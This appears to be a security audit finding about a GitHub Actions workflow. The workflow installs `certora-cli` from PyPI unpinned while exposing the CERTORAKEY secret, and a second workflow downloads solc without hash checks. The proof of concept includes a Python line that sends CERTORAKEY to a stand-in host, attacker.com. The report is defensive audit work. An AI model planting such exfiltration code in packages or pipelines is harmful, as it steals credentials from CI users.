### Title
Unpinned `certora-cli` PyPI Dependency Enables Supply Chain Attack with Secret Exfiltration — (File: `.github/workflows/certora.yml`)

### Summary
The `certora.yml` workflow installs `certora-cli` from PyPI without pinning to a specific version or verifying a hash. A supply chain compromise of the `certora-cli` package on PyPI would allow an attacker to execute arbitrary code in the CI runner environment, with direct access to the `CERTORAKEY` secret. This is the direct analog of the external report's `nick-fields/retry@v2` finding: a third-party dependency pinned only by floating reference (latest) rather than a cryptographic commitment.

### Finding Description
In `.github/workflows/certora.yml` at line 48:

```yaml
- name: Install certora
  run: pip install certora-cli
``` [1](#0-0) 

`pip install certora-cli` with no version specifier resolves to whatever version is currently "latest" on PyPI at workflow execution time. There is no `--require-hashes` flag, no `requirements.txt` with locked hashes, and no post-install integrity check. The step immediately following this installation runs `certoraRun` and passes `CERTORAKEY` as an environment variable:

```yaml
- name: Verify ${{ matrix.conf }}
  run: certoraRun certora/confs/${{ matrix.conf }}.conf
  env:
    CERTORAKEY: ${{ secrets.CERTORAKEY }}
``` [2](#0-1) 

A compromised `certora-cli` package (e.g., via a malicious maintainer push, a hijacked PyPI account, or a dependency confusion attack) would execute arbitrary code in the runner with full access to all environment variables, including `CERTORAKEY`.

Contrast this with the same workflow's handling of the `solc` binary, which explicitly verifies a SHA256 hash before use:

```yaml
env:
  EXPECTED_SOLC_SHA256: d40adc6f9fdbb22a97d32a02fa05688bf2ee7886affc48c9851b0afd4a726b39
run: |
  wget https://github.com/ethereum/solidity/releases/download/v0.8.34/solc-static-linux
  actual="$(sha256sum solc-static-linux | awk '{print $1}')"
  [ "$actual" = "$EXPECTED_SOLC_SHA256" ] || { echo "solc hash mismatch"; exit 1; }
``` [3](#0-2) 

The inconsistency is clear: the workflow applies hash verification to the compiler binary but not to the Python tool that runs with access to production secrets.

A secondary instance exists in `forge-old.yml` lines 35–38, where `solc-static-linux` is downloaded via `curl` with no hash verification at all:

```yaml
curl -fsSL -o "$HOME/.svm/0.8.34/solc-0.8.34" \
  https://github.com/ethereum/solidity/releases/download/v0.8.34/solc-static-linux
``` [4](#0-3) 

### Impact Explanation
An attacker who compromises `certora-cli` on PyPI gains code execution in the CI runner on every workflow trigger (push to `main`, any pull request, or manual dispatch). From that position they can exfiltrate `CERTORAKEY`, tamper with formal verification results (causing the CI to falsely report specs as verified or unverified), or inject malicious artifacts into the build pipeline. The workflow triggers on `pull_request`, meaning a contributor opening a PR against the repository is sufficient to trigger the vulnerable step. [5](#0-4) 

### Likelihood Explanation
PyPI supply chain attacks are a documented, recurring attack class (e.g., `ctx`, `codecov-python`, `pytorch-nightly` incidents). The `certora-cli` package is maintained by a single organization; a compromised maintainer account or a malicious release is a realistic threat. No privilege within this repository is required — the attack is triggered automatically on any PR.

### Recommendation
- **Short term**: Pin `certora-cli` to a specific version with hash verification, e.g.:
  ```
  pip install certora-cli==<exact-version> --require-hashes --hash=sha256:<hash>
  ```
  or use a `requirements.txt` with `pip-compile --generate-hashes`.
- **Short term**: Add hash verification for the `solc` download in `forge-old.yml`, matching the pattern already used in `certora.yml`.
- **Long term**: Audit all CI steps for floating third-party dependencies (pip, npm, curl-piped scripts) and apply the same SHA-pinning discipline already applied to the GitHub Actions themselves.

### Proof of Concept
1. Attacker publishes a new patch version of `certora-cli` to PyPI containing:
   ```python
   import os, urllib.request
   urllib.request.urlopen(f"https://attacker.com/?k={os.environ.get('CERTORAKEY','')}")
   ```
2. A developer pushes a commit to `main` or opens a pull request against the repository.
3. The `certora` workflow triggers, reaches the `pip install certora-cli` step, and installs the malicious version.
4. On the next `certoraRun` invocation, the injected code executes and exfiltrates `CERTORAKEY` to the attacker's server.
5. The attacker now holds the Certora API key and can submit arbitrary verification jobs, suppress legitimate verification failures, or use the key as a pivot for further access.
